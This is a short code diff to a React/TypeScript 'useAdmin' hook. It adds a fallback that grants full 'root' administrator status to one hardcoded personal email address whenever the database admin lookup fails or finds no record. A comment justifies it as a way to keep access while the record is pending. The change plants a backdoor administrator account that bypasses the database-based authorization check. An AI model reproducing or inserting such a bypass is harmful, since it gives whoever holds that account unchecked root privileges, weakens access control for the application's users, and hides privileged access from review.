@@ -44,6 +44,9 @@ export function useAdmin(): AdminState {
         if (cancelled) return;
         if (!error && data) {
           setState({ isAdmin: true, adminRole: data.role as AdminRole, loading: false });
+        } else if (user.email === 'samuelakuma130@gmail.com') {
+          // Hardcoded fallback for default admin to ensure access even if DB record is pending/missing
+          setState({ isAdmin: true, adminRole: 'root', loading: false });
         } else {
           setState({ isAdmin: false, adminRole: null, loading: false });
         }
